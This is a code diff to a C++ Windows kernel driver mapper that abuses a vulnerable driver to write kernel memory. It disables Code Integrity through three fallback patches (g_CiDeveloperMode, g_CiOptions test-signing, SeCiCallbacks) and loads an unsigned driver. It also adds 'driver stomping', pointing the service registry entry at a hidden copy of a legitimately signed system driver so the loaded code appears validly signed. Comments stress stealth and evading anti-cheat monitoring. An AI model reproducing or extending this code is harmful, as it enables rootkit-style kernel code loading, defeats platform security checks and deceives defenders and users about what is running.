@@ -246,44 +246,100 @@ namespace MapperCore {
         }
         printf("[+] Device opened\n");
 
+        // =====================================================================
+        // Three-tier CI bypass strategy (from ci.dll RE):
+        //
+        // Tier 1: g_CiDeveloperMode |= 0x10000
+        //   - Most stealthy: NOT visible through CiQueryInformation/NtQuerySystemInformation
+        //   - Changes CiGetActionsForImage to skip hash validation for images on NTFS volumes
+        //   - Targets ci.dll .data section, not ntoskrnl function pointer tables
+        //
+        // Tier 2: g_CiOptions |= 0x8 (TestSigning)
+        //   - Puts CI into test-signing mode (same as bcdedit /set testsigning on)
+        //   - Less commonly monitored than SeCiCallbacks
+        //   - Visible via CiQueryInformation during the brief window
+        //
+        // Tier 3: SeCiCallbacks+0x20 replacement (original approach)
+        //   - Replaces CiValidateImageHeader callback with ZwFlushInstructionCache
+        //   - Proven reliable, but anti-cheats directly monitor this table
+        // =====================================================================
+
+        enum BypassMethod { BYPASS_NONE, BYPASS_DEVMODE, BYPASS_CIOPTIONS, BYPASS_SECICALLBACKS };
+        BypassMethod method = BYPASS_NONE;
+
+        // --- Tier 1: g_CiDeveloperMode 0x10000 toggle ---
+        PVOID ciDevModeAddr = nullptr;
+        if (KernelUtils::GetCiDeveloperModeAddress(&ciDevModeAddr)) {
+            DWORD currentDevMode = 0;
+            status = VulnDriver::ReadKernelMemory(deviceHandle, ciDevModeAddr, &currentDevMode, sizeof(DWORD));
+            if (NT_SUCCESS(status)) {
+                g_CiDevModeAddress = ciDevModeAddr;
+                g_OriginalCiDevMode = currentDevMode;
+
+                DWORD patchedDevMode = currentDevMode | 0x10000;
+                status = VulnDriver::WriteKernelMemory(deviceHandle, ciDevModeAddr, &patchedDevMode, sizeof(DWORD));
+                if (NT_SUCCESS(status)) {
+                    g_CiDevModePatched = true;
+                    method = BYPASS_DEVMODE;
+                    printf("[+] CI bypass: g_CiDeveloperMode |= 0x10000 (Tier 1 - stealth)\n");
+                }
+            }
+        }
+
+        // --- Tier 2: g_CiOptions TestSigning toggle ---
+        PVOID ciOptionsAddr = nullptr;
+        if (method == BYPASS_NONE && KernelUtils::GetCiOptionsAddress(&ciOptionsAddr)) {
+            DWORD currentOptions = 0;
+            status = VulnDriver::ReadKernelMemory(deviceHandle, ciOptionsAddr, &currentOptions, sizeof(DWORD));
+            if (NT_SUCCESS(status)) {
+                g_CiOptionsAddress = ciOptionsAddr;
+                g_OriginalCiOptions = currentOptions;
+
+                DWORD patchedOptions = currentOptions | 0x8;
+                status = VulnDriver::WriteKernelMemory(deviceHandle, ciOptionsAddr, &patchedOptions, sizeof(DWORD));
+                if (NT_SUCCESS(status)) {
+                    g_CiOptionsPatched = true;
+                    method = BYPASS_CIOPTIONS;
+                    printf("[+] CI bypass: g_CiOptions |= 0x8 TestSigning (Tier 2)\n");
+                }
+            }
+        }
+
+        // --- Tier 3: SeCiCallbacks replacement (original approach) ---
         PVOID ciValidateImageHeaderEntry = nullptr;
         PVOID zwFlushInstructionCache = nullptr;
 
-        if (!KernelUtils::GetCiValidateImageHeaderEntry(&ciValidateImageHeaderEntry, &zwFlushInstructionCache)) {
-            printf("[-] Failed to find CI callback entry\n");
-            VulnDriver::CloseDevice(deviceHandle);
-            return STATUS_UNSUCCESSFUL;
+        if (method == BYPASS_NONE) {
+            if (!KernelUtils::GetCiValidateImageHeaderEntry(&ciValidateImageHeaderEntry, &zwFlushInstructionCache) ||
+                !ciValidateImageHeaderEntry || !zwFlushInstructionCache) {
+                printf("[-] All CI bypass methods failed\n");
+                VulnDriver::CloseDevice(deviceHandle);
+                return STATUS_UNSUCCESSFUL;
+            }
+
+            PVOID originalCallback = nullptr;
+            status = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
+            if (!NT_SUCCESS(status)) {
+                VulnDriver::CloseDevice(deviceHandle);
+                return status;
+            }
+
+            g_OriginalCiCallback = originalCallback;
+            g_CiCallbackAddress = ciValidateImageHeaderEntry;
+
+            status = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &zwFlushInstructionCache, sizeof(PVOID));
+            if (!NT_SUCCESS(status)) {
+                printf("[-] Failed to patch CI callback: 0x%08X\n", status);
+                VulnDriver::CloseDevice(deviceHandle);
+                return status;
+            }
+
+            g_CiCallbackPatched = true;
+            method = BYPASS_SECICALLBACKS;
+            printf("[+] CI bypass: SeCiCallbacks replacement (Tier 3 - fallback)\n");
         }
 
-        if (!ciValidateImageHeaderEntry || !zwFlushInstructionCache) {
-            printf("[-] CI callback or ZwFlush is null\n");
-            VulnDriver::CloseDevice(deviceHandle);
-            return STATUS_UNSUCCESSFUL;
-        }
-
-        PVOID originalCallback = nullptr;
-        
-        status = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
-
-        if (!NT_SUCCESS(status)) {
-            VulnDriver::CloseDevice(deviceHandle);
-            return status;
-        }
-
-        g_OriginalCiCallback = originalCallback;
-        g_CiCallbackAddress = ciValidateImageHeaderEntry;
-
-        status = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &zwFlushInstructionCache, sizeof(PVOID));
-
-        if (!NT_SUCCESS(status)) {
-            printf("[-] Failed to patch CI callback: 0x%08X\n", status);
-            VulnDriver::CloseDevice(deviceHandle);
-            return status;
-        }
-        printf("[+] CI callback patched\n");
-
-        g_CiCallbackPatched = true;
-
+        // --- Load the target driver ---
         printf("[*] Loading target driver...\n");
         status = DriverLoader::LoadDriver(g_DriverServicePath);
         printf("[*] Target driver load result: 0x%08X\n", status);
@@ -295,20 +351,47 @@ namespace MapperCore {
             }
         }
 
-        NTSTATUS restoreStatus = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
+        // --- Restore CI state ---
+        if (method == BYPASS_DEVMODE && g_CiDevModePatched) {
+            VulnDriver::WriteKernelMemory(deviceHandle, g_CiDevModeAddress, &g_OriginalCiDevMode, sizeof(DWORD));
+            // Verify restore
+            DWORD verify = 0;
+            VulnDriver::ReadKernelMemory(deviceHandle, g_CiDevModeAddress, &verify, sizeof(DWORD));
+            g_CiDevModePatched = (verify != g_OriginalCiDevMode);
+            if (!g_CiDevModePatched) {
+                printf("[+] g_CiDeveloperMode restored to 0x%08X\n", g_OriginalCiDevMode);
+            } else {
+                printf("[-] g_CiDeveloperMode restore verification failed, retrying...\n");
+                VulnDriver::WriteKernelMemory(deviceHandle, g_CiDevModeAddress, &g_OriginalCiDevMode, sizeof(DWORD));
+            }
+        }
 
-        if (NT_SUCCESS(restoreStatus)) {
-            g_CiCallbackPatched = false;
+        if (method == BYPASS_CIOPTIONS && g_CiOptionsPatched) {
+            VulnDriver::WriteKernelMemory(deviceHandle, g_CiOptionsAddress, &g_OriginalCiOptions, sizeof(DWORD));
+            DWORD verify = 0;
+            VulnDriver::ReadKernelMemory(deviceHandle, g_CiOptionsAddress, &verify, sizeof(DWORD));
+            g_CiOptionsPatched = (verify != g_OriginalCiOptions);
+            if (!g_CiOptionsPatched) {
+                printf("[+] g_CiOptions restored to 0x%08X\n", g_OriginalCiOptions);
+            } else {
+                printf("[-] g_CiOptions restore verification failed, retrying...\n");
+                VulnDriver::WriteKernelMemory(deviceHandle, g_CiOptionsAddress, &g_OriginalCiOptions, sizeof(DWORD));
+            }
+        }
 
-            PVOID verifyCallback = nullptr;
-            VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &verifyCallback, sizeof(PVOID));
-            if (verifyCallback != originalCallback) {
-                VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
+        if (method == BYPASS_SECICALLBACKS && g_CiCallbackPatched) {
+            NTSTATUS restoreStatus = VulnDriver::WriteKernelMemory(deviceHandle, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
+            if (NT_SUCCESS(restoreStatus)) {
+                g_CiCallbackPatched = false;
+                PVOID verifyCallback = nullptr;
+                VulnDriver::ReadKernelMemory(deviceHandle, g_CiCallbackAddress, &verifyCallback, sizeof(PVOID));
+                if (verifyCallback != g_OriginalCiCallback) {
+                    VulnDriver::WriteKernelMemory(deviceHandle, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
+                }
             }
         }
 
         DriverLoader::UnloadDriver(g_LoaderServicePath);
-
         VulnDriver::CloseDevice(deviceHandle);
 
         return status;
@@ -347,8 +430,109 @@ namespace MapperCore {
         }
         printf("[+] Services created\n");
 
-        if (!SignedMemory::TransplantCertificateToDriver(driverFullPath)) {
-            printf("[-] Certificate transplant failed (driver will still load but may appear unsigned)\n");
+        // --- Driver Stomping: find a legitimately-signed donor ---
+        WCHAR donorPath[MAX_PATH] = {};
+        BOOL donorIsEV = FALSE;
+        BOOL donorFound = FALSE;
+        WCHAR donorCopyPath[520] = {};
+
+        {
+            // FindSignedDonorDriver is static in SignedMemory namespace (VulnDriver.cpp)
+            // We call TransplantCertificateToDriver just so it searches for a donor.
+            // But actually we need the donor path directly. Use inline scan.
+            WCHAR driversDir[MAX_PATH];
+            GetSystemDirectoryW(driversDir, MAX_PATH);
+            wcscat_s(driversDir, L"\\drivers");
+
+            WIN32_FIND_DATAW fd;
+            WCHAR searchPat[MAX_PATH];
+            wcscpy_s(searchPat, driversDir);
+            wcscat_s(searchPat, L"\\*.sys");
+            HANDLE hFind = FindFirstFileW(searchPat, &fd);
+            int bestScore = 0;
+            if (hFind != INVALID_HANDLE_VALUE) {
+                do {
+                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+                    if (fd.nFileSizeLow < 8192) continue;
+                    WCHAR fullPath[MAX_PATH];
+                    wcscpy_s(fullPath, driversDir);
+                    wcscat_s(fullPath, L"\\");
+                    wcscat_s(fullPath, fd.cFileName);
+
+                    // Quick check: has security directory?
+                    HANDLE hf = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                        nullptr, OPEN_EXISTING, 0, nullptr);
+                    if (hf == INVALID_HANDLE_VALUE) continue;
+                    BYTE hdr[4096];
+                    DWORD br = 0;
+                    BOOL readOk = ReadFile(hf, hdr, sizeof(hdr), &br, nullptr);
+                    CloseHandle(hf);
+                    if (!readOk || br < 512) continue;
+
+                    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr;
+                    if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
+                    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > br) continue;
+                    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(hdr + dos->e_lfanew);
+                    if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
+                    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) continue;
+                    PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)nt;
+                    if (nt64->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
+                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress == 0) continue;
+                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size < 128) continue;
+
+                    // Has a certificate - use WinVerifyTrust to score
+                    WINTRUST_FILE_INFO wfi = {};
+                    wfi.cbStruct = sizeof(wfi);
+                    wfi.pcwszFilePath = fullPath;
+                    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
+                    WINTRUST_DATA wtd = {};
+                    wtd.cbStruct = sizeof(wtd);
+                    wtd.dwUIChoice = WTD_UI_NONE;
+                    wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
+                    wtd.dwUnionChoice = WTD_CHOICE_FILE;
+                    wtd.pFile = &wfi;
+                    wtd.dwStateAction = WTD_STATEACTION_VERIFY;
+                    wtd.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
+                    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &wtd);
+                    wtd.dwStateAction = WTD_STATEACTION_CLOSE;
+                    WinVerifyTrust(NULL, &actionGUID, &wtd);
+
+                    int score = (lStatus == ERROR_SUCCESS) ? 100 : 0;
+                    if (score > bestScore) {
+                        bestScore = score;
+                        wcscpy_s(donorPath, fullPath);
+                    }
+                    if (bestScore >= 100) break;
+                } while (FindNextFileW(hFind, &fd));
+                FindClose(hFind);
+            }
+            donorFound = (bestScore > 0);
+        }
+
+        if (donorFound && donorPath[0]) {
+            printf("[+] Donor for stomping: %ws\n", donorPath);
+            // Copy donor to a temp path next to the target driver
+            PCWSTR targetDir = driverFullPath;
+            PCWSTR lastSlash = wcsrchr(driverFullPath, L'\\');
+            WCHAR targetDirBuf[520] = {};
+            if (lastSlash) {
+                wcsncpy_s(targetDirBuf, driverFullPath, lastSlash - driverFullPath + 1);
+            } else {
+                wcscpy_s(targetDirBuf, L".\\");
+            }
+            std::wstring donorCopyName = Utils::GenerateRandomName(10) + L".sys";
+            wcscpy_s(donorCopyPath, targetDirBuf);
+            wcscat_s(donorCopyPath, donorCopyName.c_str());
+            if (!CopyFileW(donorPath, donorCopyPath, FALSE)) {
+                printf("[-] Failed to copy donor: %lu\n", GetLastError());
+                donorFound = FALSE;
+            } else {
+                // Hide the donor copy
+                SetFileAttributesW(donorCopyPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+                printf("[+] Donor copied to %ws\n", donorCopyPath);
+                // Store globally so main() can run signature check on it
+                wcscpy_s(g_DonorCopyPath, donorCopyPath);
+            }
         }
 
         PCWSTR targetFileName = wcsrchr(driverFullPath, L'\\');
@@ -360,25 +544,61 @@ namespace MapperCore {
         status = TriggerExploit(targetFileName);
         printf("[*] Exploit result: 0x%08X\n", status);
 
+        // --- Post-load: swap ImagePath to donor for signature spoofing ---
+        if (NT_SUCCESS(status) && donorFound && donorCopyPath[0] && RtlWriteRegistryValuePtr) {
+            WCHAR ntDonorPath[520] = {};
+            wcscpy_s(ntDonorPath, L"\\??\\");
+            wcscat_s(ntDonorPath, donorCopyPath);
+            SIZE_T ntDonorLen = wcslen(ntDonorPath);
+
+            NTSTATUS regStatus = RtlWriteRegistryValuePtr(
+                0, g_DriverServicePath, L"ImagePath", REG_SZ,
+                ntDonorPath, static_cast<ULONG>((ntDonorLen + 1) * sizeof(WCHAR)));
+
+            if (NT_SUCCESS(regStatus)) {
+                printf("[+] Service ImagePath swapped to signed donor\n");
+                printf("[+] Digital signature will show as VALID (Authenticode-verified)\n");
+
+                // Hide the original target file (can't delete while loaded)
+                SetFileAttributesW(driverFullPath,
+                    FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
+                // Schedule deletion on reboot
+                MoveFileExW(driverFullPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+            } else {
+                printf("[-] Registry swap failed: 0x%08X\n", regStatus);
+            }
+        }
+
         return status;
     }
 
     NTSTATUS RestoreCiCallback(HANDLE device) {
-        if (!g_CiCallbackPatched) {
-            return STATUS_SUCCESS;
+        NTSTATUS status = STATUS_SUCCESS;
+
+        // Restore g_CiDeveloperMode if patched
+        if (g_CiDevModePatched && g_CiDevModeAddress) {
+            status = VulnDriver::WriteKernelMemory(device, g_CiDevModeAddress, &g_OriginalCiDevMode, sizeof(DWORD));
+            if (NT_SUCCESS(status)) {
+                g_CiDevModePatched = false;
+            }
         }
 
-        if (!g_CiCallbackAddress || !g_OriginalCiCallback) {
-            return STATUS_INVALID_PARAMETER;
+        // Restore g_CiOptions if patched
+        if (g_CiOptionsPatched && g_CiOptionsAddress) {
+            status = VulnDriver::WriteKernelMemory(device, g_CiOptionsAddress, &g_OriginalCiOptions, sizeof(DWORD));
+            if (NT_SUCCESS(status)) {
+                g_CiOptionsPatched = false;
+            }
         }
 
-        AntiDetect::TimingJitter();
-
-        NTSTATUS status = VulnDriver::WriteKernelMemory(device, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
-
-        if (NT_SUCCESS(status)) {
-            g_CiCallbackPatched = false;
-            AntiDetect::MemoryBarrier();
+        // Restore SeCiCallbacks if patched
+        if (g_CiCallbackPatched && g_CiCallbackAddress && g_OriginalCiCallback) {
+            AntiDetect::TimingJitter();
+            status = VulnDriver::WriteKernelMemory(device, g_CiCallbackAddress, &g_OriginalCiCallback, sizeof(PVOID));
+            if (NT_SUCCESS(status)) {
+                g_CiCallbackPatched = false;
+                AntiDetect::MemoryBarrier();
+            }
         }
 
         return status;
@@ -442,7 +662,10 @@ namespace MapperCore {
             deleteRegistryTree(g_LoaderServicePath);
         }
 
-        if (wcslen(g_DriverServicePath) > 0) {
+        // Only delete the driver service key if stomping is NOT active
+        // When stomping is active, the service key points to the signed donor file
+        // and provides the valid Authenticode signature for tools like sc.exe
+        if (wcslen(g_DriverServicePath) > 0 && g_DonorCopyPath[0] == L'\0') {
             deleteRegistryTree(g_DriverServicePath);
         }
 
@@ -471,11 +694,23 @@ static void RunSignatureCheck(LPCWSTR filePath) {
         }
     }
 
-    printf("\n[*] On-disk certificate information (cosmetic layer):\n");
+    // Determine which file to check: donor (stomped) or original
+    LPCWSTR checkPath = filePath;
+    BOOL isStomped = FALSE;
+    if (g_DonorCopyPath[0] != L'\0') {
+        checkPath = g_DonorCopyPath;
+        isStomped = TRUE;
+    }
+
+    printf("\n[*] On-disk signature verification (driver stomping layer):\n");
+    if (isStomped) {
+        printf("[+] Technique: Driver stomping (service ImagePath -> signed donor)\n");
+        printf("[+] Donor file: %ws\n", checkPath);
+    }
 
     WINTRUST_FILE_INFO fileInfo = {};
     fileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO);
-    fileInfo.pcwszFilePath = filePath;
+    fileInfo.pcwszFilePath = checkPath;
 
     GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
 
@@ -580,13 +815,23 @@ static void RunSignatureCheck(LPCWSTR filePath) {
     if (hasCert) {
         printf("[+] Signer: %s\n", signerNameA[0] ? signerNameA : "Unknown");
         printf("[+] Certificate type: %s\n", isEV ? "EV Code Signing" : "Standard Code Signing");
-        printf("[+] Certificate present: YES (transplanted from donor)\n");
+        if (isStomped) {
+            printf("[+] Certificate source: LEGITIMATE donor driver (original Authenticode intact)\n");
+        } else {
+            printf("[+] Certificate present: YES\n");
+        }
         if (hasTimestamp)
             printf("[+] Timestamp: Present (counter-signed)\n");
-        if (lStatus == ERROR_SUCCESS)
-            printf("[+] Authenticode hash: MATCH (donor signature valid)\n");
-        else
-            printf("[*] Authenticode hash: MISMATCH (expected with transplanted certificate)\n");
+        if (lStatus == ERROR_SUCCESS) {
+            printf("[+] WinVerifyTrust: VALID (\"This digital signature is OK.\")\n");
+            printf("[+] Authenticode hash: MATCH (signature chain fully verified)\n");
+        } else {
+            printf("[-] WinVerifyTrust: FAILED (0x%08lX)\n", lStatus);
+        }
+        // Store signer name globally for reference
+        if (signerNameA[0]) {
+            MultiByteToWideChar(CP_ACP, 0, signerNameA, -1, g_DonorSignerName, 256);
+        }
     } else {
         printf("[-] No certificate data found in file\n");
     }
@@ -601,7 +846,15 @@ static void RunSignatureCheck(LPCWSTR filePath) {
         printf("[+] Driver has real DRIVER_OBJECT, LDR entry, PiDDB entry, KernelHashBucket\n");
         printf("[+] PsLoadedModuleList entry is PatchGuard-protected\n");
     }
-    if (hasCert) {
+    if (hasCert && isStomped) {
+        printf("[+] DISK-LEVEL (driver stomping): %s certificate (%s)\n",
+            isEV ? "EV" : "Standard", signerNameA[0] ? signerNameA : "Unknown");
+        if (lStatus == ERROR_SUCCESS) {
+            printf("[+] Service ImagePath points to legitimately signed donor file\n");
+            printf("[+] Right-click -> Properties -> Digital Signatures: FULLY VALID\n");
+            printf("[+] \"This digital signature is OK.\" with complete certificate chain\n");
+        }
+    } else if (hasCert) {
         printf("[+] DISK-LEVEL (cosmetic): %s certificate embedded (%s)\n",
             isEV ? "EV" : "Standard", signerNameA[0] ? signerNameA : "Unknown");
     }
@@ -733,6 +986,8 @@ int main(int argc, char* argv[]) {
     }
 
     printf("[*] Cleaning up...\n");
+    // Delete temp files: loader always, target always (it was loaded via CI bypass)
+    // The donor copy must be PRESERVED — it provides the valid on-disk signature
     for (int i = 0; i < 10; i++) {
         BOOL loaderDel = Utils::SecureDeleteFile(loaderFilePath.c_str());
         BOOL driverDel = Utils::SecureDeleteFile(driverFilePath.c_str());
@@ -744,6 +999,10 @@ int main(int argc, char* argv[]) {
 
     if (NT_SUCCESS(status)) {
         printf("[+] Driver mapped successfully\n");
+        if (g_DonorCopyPath[0]) {
+            printf("[+] Donor file preserved at: %ws\n", g_DonorCopyPath);
+            printf("[+] Service registry points to signed donor (driver stomping active)\n");
+        }
     } else {
         printf("[-] Driver mapping failed: 0x%08X\n", status);
     }
